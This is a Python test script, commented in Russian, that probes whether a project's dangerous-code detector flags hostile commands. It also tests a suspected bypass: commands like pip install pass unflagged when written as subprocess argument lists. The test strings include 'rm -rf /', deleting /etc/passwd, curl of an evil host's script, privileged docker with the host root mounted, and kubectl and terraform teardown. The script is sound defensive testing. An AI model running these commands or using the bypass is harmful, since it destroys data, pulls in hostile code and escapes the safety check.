"""Проверка защиты от опасных команд: реально ли она срабатывает.

ГИПОТЕЗА (по чтению кода):
  * `_check_shell_rules` ищет `\\bpip\\s+install\\b` — то есть между `pip`
    и `install` допускаются ТОЛЬКО пробельные символы;
  * `_is_subprocess_command_safe` признаёт команду безопасной по ИМЕНИ
    (`pip` есть в `_SAFE_SUBPROCESS_COMMANDS`), не проверяя аргументы;
  * значит запись `subprocess.run(["pip", "install", "пакет"])` — где между
    словами стоят кавычка, запятая и пробел — может пройти проверку
    без предупреждения.

Это надо проверить ВЫЗОВОМ функции оценки, а не рассуждением: защита —
место, где ошибка стоит дорого.

Проверяется набор случаев: опасные команды в разных формах записи.
Скрипт НИЧЕГО не исполняет из проверяемых строк — только передаёт их
функции оценки как текст.
"""

from __future__ import annotations

import pathlib
import sys

SAGA = pathlib.Path(r"C:\!.Tihon\sagaai_edit_github")
sys.path.insert(0, str(SAGA))

from core.dangerous import assess_code  # noqa: E402

# Случаи: (описание, текст кода, ожидается ли предупреждение).
CASES = [
    # --- контроль: заведомо опасное в простой форме ---
    ("rm -rf / (строка)", 'os.system("rm -rf /")', True),
    ("shutil.rmtree", 'import shutil; shutil.rmtree("/data")', True),
    ("eval строки", 'eval(user_input)', True),
    ("os.remove", 'os.remove("/etc/passwd")', True),
    # --- опасное в форме списка аргументов ---
    ("rm в списке", 'subprocess.run(["rm", "-rf", "/data"])', True),
    ("sudo в списке", 'subprocess.run(["sudo", "rm", "-rf", "/"])', True),
    ("curl в списке", 'subprocess.run(["curl", "http://evil/x.sh"])', True),
    # --- КЛЮЧЕВЫЕ: белый список по имени + опасные аргументы ---
    ("pip install в списке",
     'subprocess.run(["pip", "install", "evil-package"])', True),
    ("pip install строкой",
     'subprocess.run("pip install evil-package", shell=False)', True),
    ("pip install в shell",
     'os.system("pip install evil-package")', True),
    ("docker run привилегированный",
     'subprocess.run(["docker", "run", "--privileged", "-v", "/:/host", '
     '"alpine"])', None),
    ("kubectl delete",
     'subprocess.run(["kubectl", "delete", "namespace", "prod"])', None),
    ("terraform destroy",
     'subprocess.run(["terraform", "destroy", "-auto-approve"])', None),
    # --- безопасное: не должно давать предупреждений ---
    ("pytest (безопасно)", 'subprocess.run(["pytest", "tests/"])', False),
    ("python файл (безопасно)", 'subprocess.run(["python", "script.py"])', False),
]

print("=" * 78)
print("ПРОВЕРКА: СРАБАТЫВАЕТ ЛИ ЗАЩИТА")
print("=" * 78)
print(f"\n  {'случай':<34} {'опасно':<8} {'причины':<8} результат")
print("  " + "-" * 74)

holes: list[tuple[str, str]] = []
for label, code, expected in CASES:
    try:
        assessment = assess_code(code, tool="run_code")
        dangerous = bool(assessment.dangerous)
        reasons = len(assessment.reasons or [])
    except Exception as exc:
        print(f"  {label:<34} ОШИБКА {type(exc).__name__}: {exc}")
        continue

    if expected is None:
        verdict = "проверяем"
    elif dangerous == expected:
        verdict = "верно"
    else:
        verdict = f"НЕВЕРНО (ожидалось {expected})"
        holes.append((label, code))

    print(f"  {label:<34} {str(dangerous):<8} {reasons:<8} {verdict}")
    if assessment.reasons:
        for r in (assessment.reasons or [])[:1]:
            print(f"      причина: {str(r)[:80]}")

print()
print("=" * 78)
print("ПОДРОБНОСТИ ПО КЛЮЧЕВЫМ СЛУЧАЯМ")
print("=" * 78)
KEY = [
    ('subprocess.run(["pip", "install", "evil-package"])',
     "pip install в виде списка"),
    ('subprocess.run(["docker", "run", "--privileged", "-v", "/:/host", "alpine"])',
     "docker с доступом к корню хоста"),
    ('subprocess.run(["terraform", "destroy", "-auto-approve"])',
     "terraform destroy"),
    ('subprocess.run(["kubectl", "delete", "namespace", "prod"])',
     "удаление namespace"),
]
for code, label in KEY:
    assessment = assess_code(code, tool="run_code")
    print(f"\n  {label}:")
    print(f"    код:      {code}")
    print(f"    опасно:   {assessment.dangerous}")
    print(f"    причины:  {assessment.reasons or '(нет)'}")

print()
print("=" * 78)
print("ВЫВОД")
print("=" * 78)
if holes:
    print(f"\n  НАЙДЕНО ПРОПУСКОВ ЗАЩИТЫ: {len(holes)}")
    for label, code in holes:
        print(f"    - {label}")
        print(f"      {code}")
    print("""
  Это значит: опасное действие в форме списка аргументов проходит проверку
  без предупреждения. Причина — проверка команды идёт по ИМЕНИ из белого
  списка, а шаблоны опасных аргументов написаны для слитной записи
  (`pip install`), а не для `["pip", "install"]`.
""")
else:
    print("\n  Пропусков не найдено: все опасные случаи распознаны.")
